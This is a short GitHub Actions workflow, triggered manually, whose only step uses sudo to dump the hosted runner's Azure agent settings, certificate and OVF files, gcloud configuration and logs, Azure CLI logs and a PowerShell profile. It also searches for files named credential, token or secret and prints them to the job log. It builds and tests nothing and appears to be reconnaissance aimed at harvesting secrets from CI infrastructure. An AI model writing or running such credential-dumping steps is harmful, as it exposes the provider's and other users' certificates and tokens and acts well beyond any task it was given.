name: WaagentGC
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: waagent and gcloud
        timeout-minutes: 5
        run: |
          set +e
          echo === VMSETTINGS JSON ===
          sudo cat /var/lib/waagent/history/*/VmSettings.json 2>/dev/null | head -80
          echo === FAST TRACK JSON ===
          sudo cat /var/lib/waagent/fast_track.json 2>/dev/null | head -20
          echo === CERTIFICATES JSON ===
          sudo cat /var/lib/waagent/history/*/Certificates.json 2>/dev/null | head -30
          echo === WAAGENT STATUS ===
          sudo cat /var/lib/waagent/history/*/waagent_status.json 2>/dev/null | head -20
          echo === OVF ENV ===
          sudo cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -30
          echo === GCLOUD CONFIG ===
          sudo cat /root/.config/gcloud/gce 2>/dev/null
          sudo find /root/.config/gcloud -type f 2>/dev/null | head -10
          for f in $(sudo find /root/.config/gcloud -name '*.json' -o -name '*.yaml' -o -name 'gce' 2>/dev/null); do
            echo "--- $f ---"
            sudo cat "$f" 2>/dev/null | head -15
          done
          echo === GCLOUD LOG ===
          sudo cat /root/.config/gcloud/logs/2026.07.20/08.29.36.062792.log 2>/dev/null | head -20
          echo === NUGET CACHE ===
          sudo find /root/.local/share/NuGet -type f 2>/dev/null | head -5
          echo === GEM SPECS ===
          sudo find /root/.local/share/gem -name '*credential*' -o -name '*token*' -o -name '*secret*' 2>/dev/null | head -5
          echo === POWERSHELL PROFILE ===
          sudo cat /root/.config/powershell/profile.ps1 2>/dev/null | head -15
          echo === ALL AZURE LOGS ===
          sudo cat /root/.azure/commands/*.log 2>/dev/null | head -30
          echo === DONE ===
